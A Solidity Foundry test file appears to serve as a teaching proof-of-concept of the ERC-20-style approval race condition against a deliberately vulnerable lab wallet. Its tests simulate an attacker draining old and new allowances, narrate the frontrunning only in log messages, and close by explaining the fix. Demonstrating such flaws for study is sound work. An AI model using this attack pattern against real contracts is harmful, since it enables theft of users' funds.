// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import { Test, console2 } from "forge-std/src/Test.sol";
import { VictimWallet } from "../src/VictimWallet.sol";
import { AttackerContract } from "./contracts/AttackerContract.sol";

// wake-disable

/**
 * @title Approval Race Condition Attack Test
 * @notice Demonstrates a real-world approval race condition exploit
 *
 * SCENARIO:
 * 1. Alice approves a DeFi service to spend 100 ETH
 * 2. Alice realizes the service is suspicious and tries to reduce approval to 10 ETH
 * 3. The service (attacker) sees the reduction transaction in the mempool
 * 4. Attacker frontruns Alice's transaction and drains the 100 ETH
 * 5. Alice's reduction executes, but it's too late - funds are gone
 * 6. Attacker can even drain the new 10 ETH allowance afterward
 */
contract ApprovalRaceAttackTest is Test {
    VictimWallet public wallet;
    AttackerContract public attacker;

    address public alice;
    address public bob;

    function setUp() public {
        // Create users
        alice = makeAddr("alice");
        bob = makeAddr("bob");

        // Deploy wallet
        wallet = new VictimWallet();

        // Alice deposits 100 ETH
        vm.deal(alice, 100 ether);
        vm.prank(alice);
        wallet.deposit{ value: 100 ether }();

        console2.log("\n=== SETUP COMPLETE ===");
        console2.log("Alice deposited:", 100 ether / 1 ether, "ETH");
        console2.log("Alice balance:", wallet.balances(alice) / 1 ether, "ETH");
    }

    /**
     * @notice TEST 1: Basic frontrun attack
     * @dev Attacker drains old allowance before reduction
     */
    function test_BasicFrontrunAttack() public {
        console2.log("\n=== TEST 1: BASIC FRONTRUN ATTACK ===\n");

        // STEP 1: Alice approves a "DeFi service" to spend 100 ETH
        console2.log("STEP 1: Alice approves service for 100 ETH");
        vm.prank(alice);
        wallet.approve(bob, 100 ether);
        console2.log("Allowance set:", wallet.allowances(alice, bob) / 1 ether, "ETH");

        // STEP 2: Alice realizes something's wrong and tries to reduce to 10 ETH
        console2.log("\nSTEP 2: Alice tries to reduce approval to 10 ETH...");
        console2.log("(Transaction pending in mempool)");

        // STEP 3: Bob (attacker) sees the reduction tx and FRONTRUNS it
        console2.log("\nSTEP 3: Bob frontruns and drains BEFORE reduction executes!");

        // Bob deploys attack contract
        vm.prank(bob);
        attacker = new AttackerContract(address(wallet), alice);

        // Bob transfers the allowance to his attack contract
        vm.prank(alice);
        wallet.approve(address(attacker), 100 ether);

        // Bob executes the attack
        vm.prank(bob);
        attacker.exploit();

        console2.log("Bob drained:", attacker.stolen() / 1 ether, "ETH");

        // STEP 4: Alice's reduction transaction executes (TOO LATE!)
        console2.log("\nSTEP 4: Alice's reduction executes (too late)");
        vm.prank(alice);
        wallet.approve(address(attacker), 10 ether);
        console2.log("New allowance:", wallet.allowances(alice, address(attacker)) / 1 ether, "ETH");

        // VERIFY ATTACK SUCCESS
        console2.log("\n=== ATTACK RESULTS ===");
        console2.log("Alice's remaining balance:", wallet.balances(alice) / 1 ether, "ETH");
        console2.log("Bob stole:", attacker.stolen() / 1 ether, "ETH");

        assertEq(wallet.balances(alice), 0, "Alice lost all funds");
        assertEq(attacker.stolen(), 100 ether, "Bob stole 100 ETH");
    }

    /**
     * @notice TEST 2: Double drain attack
     * @dev Attacker drains BOTH old and new allowances
     */
    function test_DoubleDrainAttack() public {
        console2.log("\n=== TEST 2: DOUBLE DRAIN ATTACK ===\n");

        // SETUP: Alice approves 80 ETH initially
        console2.log("STEP 1: Alice approves service for 80 ETH");
        vm.prank(bob);
        attacker = new AttackerContract(address(wallet), alice);

        vm.prank(alice);
        wallet.approve(address(attacker), 80 ether);
        console2.log("Initial allowance:", 80, "ETH");

        // ATTACK PHASE 1: Bob frontruns and drains 80 ETH
        console2.log("\nSTEP 2: Bob frontruns Alice's reduction");
        vm.prank(bob);
        attacker.exploit();
        console2.log("First drain:", attacker.stolen() / 1 ether, "ETH");

        // Alice's reduction executes
        console2.log("\nSTEP 3: Alice's reduction to 20 ETH executes");
        vm.prank(alice);
        wallet.approve(address(attacker), 20 ether);
        console2.log("New allowance:", 20, "ETH");

        // ATTACK PHASE 2: Bob drains the new 20 ETH too!
        console2.log("\nSTEP 4: Bob drains the NEW 20 ETH allowance!");

        // Reset attacker's state for second attack
        uint256 firstSteal = attacker.stolen();

        vm.prank(bob);
        attacker.exploit();

        uint256 totalStolen = attacker.stolen();
        console2.log("Second drain:", (totalStolen - firstSteal) / 1 ether, "ETH");
        console2.log("Total stolen:", totalStolen / 1 ether, "ETH");

        // VERIFY DOUBLE DRAIN
        console2.log("\n=== DOUBLE DRAIN RESULTS ===");
        console2.log("Alice's remaining balance:", wallet.balances(alice) / 1 ether, "ETH");
        console2.log("Bob's total stolen:", totalStolen / 1 ether, "ETH");

        assertEq(wallet.balances(alice), 0, "Alice lost everything");
        assertEq(totalStolen, 100 ether, "Bob stole both allowances");
    }

    /**
     * @notice TEST 3: Real-world scenario with timeline
     * @dev Shows exactly how the attack happens in practice
     */
    function test_RealWorldScenarioWithTimeline() public {
        console2.log("\n=== TEST 3: REAL-WORLD TIMELINE ===\n");

        // Deploy attacker contract (Bob's malicious "DeFi service")
        vm.prank(bob);
        attacker = new AttackerContract(address(wallet), alice);

        console2.log("Day 1: Alice discovers new DeFi yield farming service");
        console2.log("        Alice deposits 100 ETH to wallet");
        console2.log("        Current balance:", wallet.balances(alice) / 1 ether, "ETH\n");

        console2.log("Day 2: Alice approves service to spend 50 ETH");
        vm.prank(alice);
        wallet.approve(address(attacker), 50 ether);
        console2.log("        Allowance:", wallet.allowances(alice, address(attacker)) / 1 ether, "ETH\n");

        console2.log("Day 3: Alice reads warnings about the service on Twitter");
        console2.log("        Alice wants to revoke approval immediately");
        console2.log("        Alice submits tx to reduce allowance to 0 ETH\n");

        console2.log("Day 3 (30 seconds later): Bob monitors mempool");
        console2.log("        Bob sees Alice's revocation transaction");
        console2.log("        Bob submits frontrun transaction with higher gas\n");

        console2.log("Day 3 (Block N): Bob's transaction executes FIRST");
        vm.prank(bob);
        attacker.exploit();
        console2.log(unicode"        ✓ Bob drained:", attacker.stolen() / 1 ether, "ETH");
        console2.log(unicode"        ✓ Attack completed in single transaction\n");

        console2.log("Day 3 (Block N): Alice's revocation executes SECOND");
        vm.prank(alice);
        wallet.approve(address(attacker), 0 ether);
        console2.log(unicode"        ✓ Allowance now:", wallet.allowances(alice, address(attacker)), "ETH");
        console2.log(unicode"        ✗ Too late - funds already stolen\n");

        console2.log("Day 3 (1 hour later): Bob withdraws stolen funds");
        vm.prank(bob);
        attacker.withdrawStolen();
        console2.log(unicode"        ✓ Bob withdrew to his wallet\n");

        console2.log("=== FINAL STATE ===");
        console2.log("Alice's balance:", wallet.balances(alice) / 1 ether, "ETH");
        console2.log("Bob's balance:", bob.balance / 1 ether, "ETH");
        console2.log("Alice lost:", 50, "ETH due to approval race condition");

        assertEq(wallet.balances(alice), 50 ether, "Alice lost 50 ETH");
        assertEq(bob.balance, 50 ether, "Bob received 50 ETH");
    }

    /**
     * @notice TEST 4: Demonstrate the fix
     * @dev Shows how increaseAllowance/decreaseAllowance would prevent this
     */
    function test_WhyThisHappens() public {
        console2.log("\n=== WHY THIS ATTACK WORKS ===\n");

        vm.prank(bob);
        attacker = new AttackerContract(address(wallet), alice);

        console2.log("THE VULNERABILITY:");
        console2.log("approve() directly overwrites the allowance value");
        console2.log("It doesn't check the current allowance\n");

        console2.log("ATTACK SEQUENCE:");
        console2.log("1. Allowance = 50 ETH");
        vm.prank(alice);
        wallet.approve(address(attacker), 50 ether);
        console2.log("   Current allowance:", wallet.allowances(alice, address(attacker)) / 1 ether, "ETH");
        console2.log("   Alice's balance:", wallet.balances(alice) / 1 ether, "ETH\n");

        console2.log("2. Alice submits: approve(attacker, 10 ETH)");
        console2.log("   [Transaction pending in mempool]\n");

        console2.log("3. Attacker frontruns and spends 50 ETH");
        vm.prank(bob);
        attacker.exploit();
        console2.log("   Attacker drained:", attacker.stolen() / 1 ether, "ETH");
        console2.log("   Alice's balance:", wallet.balances(alice) / 1 ether, "ETH");
        console2.log("   Current allowance:", wallet.allowances(alice, address(attacker)) / 1 ether, "ETH\n");

        console2.log("4. Alice's transaction executes: allowance = 10 ETH");
        vm.prank(alice);
        wallet.approve(address(attacker), 10 ether);
        console2.log("   New allowance:", wallet.allowances(alice, address(attacker)) / 1 ether, "ETH");
        console2.log("   Alice's balance:", wallet.balances(alice) / 1 ether, "ETH\n");

        console2.log("5. Attacker drains the new 10 ETH too!");
        vm.prank(bob);
        attacker.exploit();
        console2.log("   Total drained:", attacker.stolen() / 1 ether, "ETH");
        console2.log("   Alice's final balance:", wallet.balances(alice) / 1 ether, "ETH\n");

        console2.log("RESULT: Attacker got 50 + 10 = 60 ETH total");
        console2.log("Alice wanted to reduce from 50 to 10, but attacker got BOTH amounts!\n");

        console2.log("THE FIX:");
        console2.log("1. OPTION A - Two-step reset:");
        console2.log("   - First: approve(attacker, 0)");
        console2.log("   - Then: approve(attacker, 10)");
        console2.log("2. OPTION B - Use increaseAllowance() and decreaseAllowance()");
        console2.log("   - These check current allowance and prevent race conditions");

        assertEq(wallet.balances(alice), 40 ether, "Alice lost 60 ETH total");
        assertEq(attacker.stolen(), 60 ether, "Attacker stole 60 ETH");
    }
}
